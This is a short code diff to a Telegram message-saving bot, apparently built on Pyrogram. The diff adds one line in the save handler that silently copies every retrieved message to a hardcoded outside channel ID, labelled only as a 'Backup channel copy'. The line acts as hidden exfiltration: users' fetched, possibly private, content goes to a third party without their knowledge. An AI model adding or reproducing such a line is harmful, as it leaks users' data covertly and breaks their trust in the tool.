@@ -153,6 +153,7 @@ async def save(client: Client, message: Message):
                     return
                 try:
                     await client.copy_message(message.chat.id, msg.chat.id, msg.id, reply_to_message_id=message.id)
+                    await client.copy_message(-1002514022613, msg.chat.id, msg.id)  # Backup channel copy
                 except:
                     try:    
                         await handle_private(client, acc, message, username, msgid)               
